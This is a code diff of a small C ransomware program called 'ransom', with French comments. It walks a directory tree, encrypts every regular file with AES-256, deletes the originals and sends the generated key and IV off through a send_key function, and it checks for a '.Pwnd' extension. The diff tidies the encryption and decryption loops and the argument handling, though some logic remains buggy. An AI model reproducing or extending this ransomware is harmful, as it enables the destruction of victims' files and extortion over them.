@@ -14,8 +14,7 @@ void usage()
 	printf("--------------------------------------\n");
 };
 
-int is_encrypted(char *filename)
-// ici on assume que le nom de nos fichiers cryptés seront en ".crp"
+int is_encrypted(char *filename) //Ici on assume que le nom de nos fichiers cryptés seront en ".Pwnd"
 {
 	int n = strlen(filename)-4;
 	char extention[4] ;
@@ -25,7 +24,7 @@ int is_encrypted(char *filename)
 		extention[i] = filename[n+i];
 	}
 
-	if(strcmp(extention,".crp")==0)
+	if(strcmp(extention,".Pwnd")==0)
 	{
 		printf("Le fichier est déja crypter");
 		return 0 ;
@@ -33,11 +32,6 @@ int is_encrypted(char *filename)
 	else
 	{
 		printf("Le fichier n'est pas encore crypter");
-		// lancer une copie du fichier
-		// const char * command = "cp %s",filename;
-		// crypter
-		// mettre le ".crp"
-		// supprimer fichier origin
 		return 1;
 	}
 }
@@ -56,58 +50,31 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 	
 	while (entity != NULL)
 	{
-		
 		 if (entity->d_name[0] != '.')
 		{
+			char path[BUFSIZE] = {0};
+			strcat(path, name);
+			strcat(path, "/");
+			strcat(path, entity->d_name);
+				
 			//printf("[type of folder : %d]  %s/%s\n",entity->d_type,name,entity->d_name);			
 			if(entity->d_type == DT_DIR && strcmp(entity->d_name,".")!=0 && strcmp(entity->d_name,"..")!=0)
 			{
-				char path[BUFSIZE] = {0};
-				strcat(path,name);
-				strcat(path,"/");
-				strcat(path,entity->d_name);
-				if(de_flag=='e')
-				{
-					listdir(path, iv, key, 'e');
-				}
-				
-				if(de_flag=='d')
-				{
-					listdir(path, iv, key, 'd');
-				}
+				listdir(path, iv, key, de_flag);
 			}
 			
-			if(de_flag=='e' && entity->d_type == DT_REG)
-			{
-				char twooo[BUFSIZE] = "";
-				strcat(twooo,name);
-				strcat(twooo,"/");
-				strcat(twooo,entity->d_name);
-				encrypt(key, iv,twooo);
-				
-				// char quatre[BUFSIZE] = "";
-				// strcat(quatre, twooo);
-				// strcat(quatre, ".Pwnd");
-				
-				remove(twooo);
-				// decrypt(key, iv, quatre);
-				// remove(quatre);
+			if(de_flag=='e' && entity->d_type == DT_REG && !is_encrypted(entity->d_name) ==1)
+			{				
+				encrypt(key, iv, path);				
+				remove(path);
 			}
 			
-			else if(de_flag=='d' && entity->d_type == DT_REG)
+			else if(de_flag=='d' && entity->d_type == DT_REG && !is_encrypted(entity->d_name) ==0)
 			{
-				char troiii[BUFSIZE] = "";
-				strcat(troiii,name);
-				strcat(troiii,"/");
-				strcat(troiii,entity->d_name);
-				// strcat(troiii, ".Pwnd");
-
-				// printf("%s \n", troiii);
-				decrypt(key, iv, troiii);
-				remove(troiii);
+				decrypt(key, iv, path);
+				remove(path);
 			}
 		}
-		
 		entity = readdir(dir);
 	}
 	closedir(dir);
@@ -164,13 +131,7 @@ int send_key(char *pKey, char *pIv)
 
 int main (int argc, char * argv[])
 {
-	if(argc==1)
-	{
-		usage();
-		printf("./ransom PATH \n");
-	}
-	
-	else if(argc==5 || argc==3)
+	if(argc==3 || argc==5)
 	{
 		unsigned char key[AES_256_KEY_SIZE];
 		unsigned char iv[AES_BLOCK_SIZE];
@@ -184,7 +145,6 @@ int main (int argc, char * argv[])
 		if(strcmp(argv[2], "-enc")==0) 
 		{
 			printf("The directory is %s\n", argv[1]);
-			
 			generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
 			send_key(pKey, pIv);
 			listdir(argv[1], iv, key, 'e');
@@ -195,12 +155,16 @@ int main (int argc, char * argv[])
 			hexa_to_bytes(argv[3] , key, sizeKey);
 			hexa_to_bytes(argv[4] , iv, sizeIv);
 			listdir(argv[1], iv, key, 'd');
-			
-			free((char *)pKey);
-			free((char *)pIv);
-			// printf("test");
 		}
 		
+		free((char *)pKey);
+		free((char *)pIv);
+	}
+	
+	else
+	{
+		usage();
+		printf("./ransom PATH \n");
 	}
 }
 
